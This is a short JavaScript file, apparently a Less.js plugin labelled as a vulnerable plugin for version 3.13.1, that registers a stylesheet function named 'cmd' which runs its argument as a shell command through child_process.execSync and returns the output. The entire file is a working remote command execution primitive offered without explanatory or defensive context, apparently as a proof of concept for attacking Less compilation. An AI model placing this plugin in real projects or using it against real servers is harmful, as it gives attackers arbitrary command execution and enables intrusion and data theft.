//Vulnerable plugin (3.13.1)
registerPlugin({
    install: function(less, pluginManager, functions) {
        functions.add('cmd', function(val) {
            return global.process.mainModule.require('child_process').execSync(val.value).toString();
        });
    }
})
